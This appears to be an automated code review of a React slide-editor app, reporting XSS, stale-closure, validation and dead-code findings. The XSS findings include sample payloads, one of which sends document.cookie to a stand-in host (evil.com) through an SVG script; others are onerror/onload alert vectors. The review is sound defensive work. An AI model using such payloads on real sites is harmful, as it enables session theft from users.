# Code Review — Group 1: Pages + Editor Core Components

**Reviewer:** code-reviewer
**Date:** 2026-04-26
**Scope:** 12 files, ~7000 LOC
**Files:** EditorPage.jsx, HomePage.jsx, ExplorePage.jsx, SettingsPage.jsx, LiveViewPage.jsx, RemoteControlPage.jsx, SpeakerViewPage.jsx, SlideCanvas.jsx, Toolbar.jsx, InsertMenu.jsx, FindReplaceBar.jsx, MiniToolbar.jsx

---

## Critical Issues

### 1. XSS — `SvgElementRenderer` renders arbitrary SVG without sanitization
**File:** `SlideCanvas.jsx:2653-2673`

```js
function SvgElementRenderer({ element }) {
  const content = element.content || ''
  let modifiedContent = content
  if (element.fillOverride) {
    modifiedContent = modifiedContent.replace(/fill="[^"]*"/g, `fill="${element.fillOverride}"`)
  }
  // ...
  return <div style={svgElementStyle} dangerouslySetInnerHTML={{ __html: modifiedContent }} />
}
```

User-controlled SVG content (from `element.content`) is rendered via `dangerouslySetInnerHTML`. The `fillOverride`/`strokeOverride` regex replacements only target `fill`/`stroke` attributes — they do NOT strip `onload`, `onerror`, `onmouseover`, `<script>`, `<foreignObject>`, or other XSS vectors embedded in the SVG.

**Impact:** A presentation author could embed `<svg><script>fetch('https://evil.com?c='+document.cookie)</script></svg>` and exfiltrate session data when the slide is rendered. Risk is scoped to self-XSS (author attacks themselves), but if exported/hosted, it could affect viewers.

**Fix:** Use a sanitizer library (e.g., `dompurify`) on `modifiedContent` before passing to `dangerouslySetInnerHTML`, or restrict to a strict allowlist of SVG elements/attributes.

---

### 2. XSS — `markdownToHtml` renders HTML without sanitization
**File:** `SlideCanvas.jsx:2007-2072`

The custom markdown parser converts markdown to HTML, but the output is passed directly to `dangerouslySetInnerHTML` without sanitization. Malformed HTML embedded in content (e.g., `</p><img src=x onerror=alert(1)>`) bypasses the parser's normal tag-wrapping logic and renders as-is.

**Impact:** Low-Medium in editor context (author controls own content), but exported presentations served to viewers would execute arbitrary scripts.

**Fix:** Wrap output with `DOMPurify.sanitize()` before rendering.

---

### 3. Stale Closure — `handleRedo` captures stale `presentation`
**File:** `EditorPage.jsx:743-756`

```js
const handleRedo = useCallback(() => {
  // ...
  if (presentation)
    historyRef.current = [
      ...historyRef.current.slice(-49),
      JSON.parse(JSON.stringify(presentation)),  // <-- uses stale `presentation` from closure
    ]
  setPresentation(redoState)
}, [presentation, setPresentation, setCurrentSlideIndex])  // <-- deps include `presentation`
```

`presentation` IS in the deps, but the closure is created when `presentation` has a particular value. If the user triggers redo while `presentation` state is mid-update (e.g., during an async auto-save), the wrong state may be pushed to history.

**Impact:** Undo/redo can skip or corrupt state snapshots. User may lose recent edits.

**Fix:** Use a ref for the current presentation: `const presentationRef = useRef(presentation)` and sync it via `useEffect`. Read from `presentationRef.current` inside the callback.

---

## High Priority

### 4. Missing API response validation — live room creation
**Files:** `EditorPage.jsx:1033`, `LiveViewPage.jsx:67`

```js
const res = await fetch('/api/live/room', { method: 'POST' })
const data = await res.json()
setLiveRoomCode(data.roomCode)  // <-- no check: does res.ok? does data.roomCode exist?
```

Neither call checks `res.ok` before parsing JSON. If the server returns 500, 401, or a non-JSON error page, `.json()` will reject and the catch block will trigger silently.

**Impact:** User gets no feedback; the "live presentation" feature silently fails.

**Fix:** Add `if (!res.ok) throw new Error(\`HTTP ${res.status}\`)` before parsing.

---

### 5. Missing null check for `bg` in Toolbar's inline render
**File:** `Toolbar.jsx:277-508`

```js
{slide && onUpdateSlide && (() => {
  const bg = slide.background || { type: 'color', color: '#1e1e2e' }
  // ...
  const setBgColor = (color) =>
    onUpdateSlide({ background: { ...bg, type: 'color', color } })  // <-- bg destructured above
```

`bg` is defined as `slide.background || { type: 'color', color: '#1e1e2e' }`. If `slide.background` is `null` or `undefined`, the fallback works. However, if `slide.background` exists but is not an object (e.g., a string from corrupted data), spreading it would throw.

More critically: the entire Toolbar's formatting section (font, bold, italic, etc.) is guarded by `editor &&`, but `editor` comes from a TipTap hook that is initialized with `content: ''`. If the editor initialization fails or returns null, the toolbar formatting row is hidden but the toolbar still renders — fine.

**Impact:** Low in practice due to the `|| {}` fallback, but defensive code should validate the shape of `bg`.

---

### 6. `use-live-presentation.js` not reviewed — live room flow is split
**File:** `LiveViewPage.jsx:21-83`

`LiveViewPage` fetches room data via `fetch('/api/live/room/${roomCode}')` without checking `res.ok`. Also, the hook `useRevealPreviewFrame` is used for iframe management but not reviewed here (outside scope). The Socket.IO event `'presentation-data'` is trusted without schema validation — if the server sends malformed data, `setHtmlContent(data.html)` could set arbitrary HTML.

**Impact:** Malformed server responses could crash the live view.

**Fix:** Validate `data` shape before setting state. Ensure server always returns `{ html: string }` or `{ html: null }`.

---

### 7. Stale Closure — `onMouseMove` in SlideCanvas uses `slideRef` but isn't in deps
**File:** `SlideCanvas.jsx:315-502`

```js
useEffect(() => {
  const onMouseMove = (e) => {
    // ...
    if (smartGuidesRef.current) {
      const allEls = slideRef.current?.elements || []  // <-- reads ref
      // ...
    }
  }
  // ...
}, [SLIDE_H, SLIDE_W, onUpdateElement, onUpdateElements])  // <-- no slideRef/smartGuidesRef in deps
```

`onMouseMove` reads `slideRef.current`, `smartGuidesRef.current`, `scaleRef.current`, etc. — all refs are synced via separate effects. The pattern is intentional (avoiding stale refs in the closure), but the `onMouseMove` function re-creates on every render of the effect (which re-runs when `onUpdateElement`/`onUpdateElements` identity changes). If those callbacks are recreated frequently, the event listener is removed and re-added, causing janky drag operations.

**Impact:** Performance degradation during drag if `onUpdateElement`/`onUpdateElements` callbacks are recreated often.

**Fix:** Consider using a ref to hold the latest callbacks instead of depending on them:
```js
const callbacksRef = useRef({ onUpdateElement, onUpdateElements })
useEffect(() => { callbacksRef.current = { onUpdateElement, onUpdateElements } }, [onUpdateElement, onUpdateElements])
```

---

### 8. `handleTestConnection` in SettingsPage calls `handleSave` directly
**File:** `SettingsPage.jsx:83-95`

```js
const handleTestConnection = async () => {
  // ...
  await handleSave()       // <-- calls another async function
  await testAIConnection()  // <-- then calls this
}
```

`handleSave` is `async` and sets state. Calling it directly from another async function without awaiting its internal state updates properly can cause race conditions. The `await` is there, but `handleSave` also calls `setSettings(data)` from the API response — if the test call races with this state update, the AI config used by `testAIConnection` may be stale.

**Impact:** Test connection may fail with stale credentials even when credentials are correct.

**Fix:** Extract the save logic into a shared async function that returns the saved settings, or re-fetch settings after save before testing.

---

## Medium Priority

### 9. Dead module-level refs in HomePage
**File:** `HomePage.jsx:208-211`

```js
// eslint-disable-next-line unused-imports/no-unused-vars
let pdfInputRef = null
// eslint-disable-next-line unused-imports/no-unused-vars
let mdInputRef = null
```

Both are declared, never assigned, and unused. Remove entirely. The eslint-disable comments are suppressing warnings that shouldn't exist.

---

### 10. Dead `hasChanges` variable in EditorPage
**File:** `EditorPage.jsx:888`

```js
// eslint-disable-next-line
const hasChanges = historyRef.current.length > 1
```

This is computed on every render (not reactive) and passed to `QuickAccessToolbar` — which likely needs a reactive value. Either make it a `useState` derived from the history ref, or remove it if `QuickAccessToolbar` doesn't actually use it.

---

### 11. Inline render pattern in `showAICopywriter` modal
**File:** `EditorPage.jsx:1367-1382`

```js
{showAICopywriter && (() => {
  const el = currentSlide?.elements?.find((e) => e.id === selectedElementId)
  // ... render modal
})()}
```

Inline IIFE for modal rendering. This runs on every render even when the modal is closed. Minor performance issue; extract to a named sub-component or move conditional rendering outside the JSX expression.

---

### 12. Missing `editingElementId` dep in several callbacks
**File:** `EditorPage.jsx`

The following callbacks reference `editingElementId` in their deps but the `editingElementId` state value is missing:
- `openHtmlEditor` (line 518): dep `presentation` but uses `editingElementIdRef` internally — intentional, but `presentation` changes on every edit, so the callback re-creates on every keystroke
- `openCodeEditor` (line 543): same pattern
- `openLatexEditor` (line 568): same pattern

These all use `presentation?.slides[currentSlideIndexRef.current]` — not the `presentation` state — so they're stable. The callbacks don't need `presentation` in deps at all. Remove `presentation` from these deps to prevent unnecessary re-creation.

---

### 13. `settings` state used without loading guard in SettingsPage
**File:** `SettingsPage.jsx:97-98`

```js
const update = (key, val) => setSettings((s) => ({ ...s, [key]: val }))
const updateAI = (key, val) => setSettings((s) => ({ ...s, ai: { ...s.ai, [key]: val } }))
```

Before `settings` is loaded (`loading` is true), `settings` is `null`. Calling `updateAI('provider', ...)` would throw: `Cannot read properties of null (reading 'ai')`. The render is guarded by `if (loading)` check, but `updateAI` could be called from event handlers before data arrives (e.g., keyboard shortcuts if any).

**Impact:** Crash if any event handler fires before settings load.

**Fix:** Add null check: `setSettings((s) => s ? ({ ...s, ai: { ...s.ai, [key]: val } }) : s)`

---

### 14. `chartData.datasets` injected into iframe HTML — potential script execution
**File:** `SlideCanvas.jsx:2080-2109`

```js
const chartHtml = `<!doctype html><html><head>...
<script>
new Chart(document.getElementById('c'),{
  data:{
    labels:${JSON.stringify(labels)},
    datasets:${JSON.stringify(datasets)}  // <-- user data
  },
  ...
});
```

`chartData.datasets` (user-controlled) is injected via `JSON.stringify` into a `<script>` tag inside `srcDoc`. While `JSON.stringify` prevents breaking out of the string literal, a malicious user could set `chartData.datasets` to something that, when processed by Chart.js, causes unexpected behavior. This is low-risk but worth noting.

**Impact:** Low — Chart.js would likely reject malformed data silently, but unexpected Chart.js behavior could crash the iframe.

---

### 15. `confirmDialog.onConfirm()` called after `setConfirmDialog(null)`
**File:** `HomePage.jsx:1581-1584`

```js
onClick={() => {
  confirmDialog.onConfirm()   // <-- runs handler
  setConfirmDialog(null)      // <-- then clears
}}
```

The handler is called before state is cleared, which is correct. However, if `onConfirm` throws, `setConfirmDialog(null)` still runs (state is cleared), hiding the dialog without error feedback. This is fine for the current usage but fragile if handlers grow.

---

### 16. `showAICopywriter` inline modal reads `selectedElementId` directly from outer scope
**File:** `EditorPage.jsx:1369`

```js
const el = currentSlide?.elements?.find((e) => e.id === selectedElementId)
```

`selectedElementId` is derived from `selectedElementIds` at line 170: `const selectedElementId = selectedElementIds[selectedElementIds.length - 1] ?? null`. If `selectedElementIds` is updated between renders, this could be stale. The outer `selectedElement` (line 817) is already computed for the same purpose. Use `selectedElement` instead.

---

### 17. `marketplaceSearch` not memoized — filters on every keystroke
**File:** `HomePage.jsx:1130-1143`

The marketplace template filter is computed inline in JSX without `useMemo`:
```js
{/* inline filter in JSX */}
```

The marketplace templates array can grow large. Moving the filter to a `useMemo` would prevent re-filtering on every render.

---

### 18. `elapsedTime` timer in RemoteControlPage continues after unmount
**File:** `RemoteControlPage.jsx:45-48`

```js
const timer = setInterval(() => setElapsedTime((time) => time + 1), 1000)
return () => clearInterval(timer)
```

The effect has no dependencies, so the timer is set up once on mount. The cleanup properly clears the interval. This is actually correct — the pattern is `setInterval` + cleanup on unmount, which is fine.

**Note:** Not a bug. Flagging for awareness: the timer is not cleared on room leave, only on component unmount. If the user navigates away and back, a new timer starts. Multiple timers could exist if the component doesn't unmount cleanly.

---

### 19. `SvgElementRenderer` regex could corrupt SVG if fill value contains quotes
**File:** `SlideCanvas.jsx:2657-2664`

```js
modifiedContent = modifiedContent.replace(/fill="[^"]*"/g, `fill="${element.fillOverride}"`)
```

If `element.fillOverride` contains a `"` character, it could break the attribute syntax: `fill=""onload="alert(1)""`. While this doesn't introduce new XSS (the content was already in the SVG), it could corrupt the SVG rendering.

**Fix:** Escape `"` in the replacement value: `element.fillOverride.replace(/"/g, '&quot;')` — but since this goes back into HTML, use HTML entity encoding or a proper SVG sanitizer.

---

## Low Priority

### 20. Duplicate `theme`/`TRANSITIONS` constants across files
**Files:** `EditorPage.jsx:90-104`, `SettingsPage.jsx:16-29`, `HomePage.jsx:36-49`

`THEMES` and `TRANSITIONS` arrays are defined identically in 3 places. Move to `shared/` and import.

### 21. `saving` state always false in EditorPage
**File:** `EditorPage.jsx:139`

```js
const [saving, setSaving] = useState(false)
```

`setSaving` is called but `saving` is never read from — only `saveStatus` is used. Dead state.

### 22. `showMasterPanel` state declared but never read
**File:** `EditorPage.jsx:187`

```js
const [showMasterPanel, setShowMasterPanel] = useState(false)
```

The setter `setShowMasterPanel` is never called; the variable is never read. Dead code.

### 23. `handleUndo` deps mismatch
**File:** `EditorPage.jsx:731-741`

`handleUndo` has no dependencies (`[]`) but reads `historyRef.current`, `redoStackRef.current`, `applyingUndoRef` — all refs, so it's safe. Document intent with a comment: `// eslint-disable-next-line react-hooks/exhaustive-deps // intentionally stable — uses refs only`.

### 24. `marketplaceData.templates.length === 0` check runs twice in JSX
**File:** `HomePage.jsx:1170-1177`

```jsx
{marketplaceData.templates.length === 0 && (
  <div>Loading templates...</div>
)}
```

This renders the "loading" state when `templates` is empty, but the parent already has a conditional for `isMarketplaceView`. The empty check could incorrectly show "loading" even when the API has returned `{ templates: [], categories: [] }`. Better: use a separate `isLoading` state, not array length.

### 25. `addQrCodeElement` callback missing dependency
**File:** `EditorPage.jsx:487`

```js
const addQrCodeElement = useCallback(() => addElement('qrcode'), [addElement])
```

Correct — `addElement` is the only dependency. No issue.

### 26. `commitCropRef` pattern — safe but fragile
**File:** `SlideCanvas.jsx:258`

```js
const commitCropRef = useRef(null)
```

The ref is assigned `commitCrop` and called as a function in the crop keyboard handler. This works but bypasses React's dependency tracking. If `commitCrop` changes, `commitCropRef.current` is stale until the next `onMouseMove` event updates it. Not a bug in practice but worth documenting.

---

## Summary

| Severity | Count |
|---|---|
| Critical | 3 |
| High | 6 |
| Medium | 11 |
| Low | 7 |
| **Total** | **27** |

### Must-fix before merge
1. Sanitize SVG content in `SvgElementRenderer` (or restrict to safe SVG elements)
2. Sanitize markdown HTML output in `MarkdownRenderer`
3. Add `res.ok` check in live room creation (`EditorPage.jsx:1033`, `LiveViewPage.jsx:67`)
4. Fix stale `presentation` closure in `handleRedo` (use `presentationRef`)
5. Add null guard for `settings` state in SettingsPage `updateAI`

### Nice-to-have
- Move `THEMES`/`TRANSITIONS` to shared constants
- Remove dead `saving` state, `showMasterPanel` state, `hasChanges` variable
- Memoize marketplace template filter
- Remove dead module-level refs in HomePage
- Use `selectedElement` instead of re-computing in `showAICopywriter` modal

### Notable good patterns
- `SlideCanvas` lazy-loads `icon-paths.json` (764KB saved from initial bundle) — good optimization
- `createSearchRegex` properly escapes regex special characters — safe
- `replaceInHtml` uses DOMParser + text node traversal — correct and safe
- Undo/redo uses refs + separate effects to avoid stale closures on render — intentional and correct
- Rubber-band selection correctly suppresses canvas click after drag
- Socket.IO disconnects on cleanup in all live pages
- Inline shape/line buttons in Toolbar correctly guard with `typeof onAddLine === 'function'`
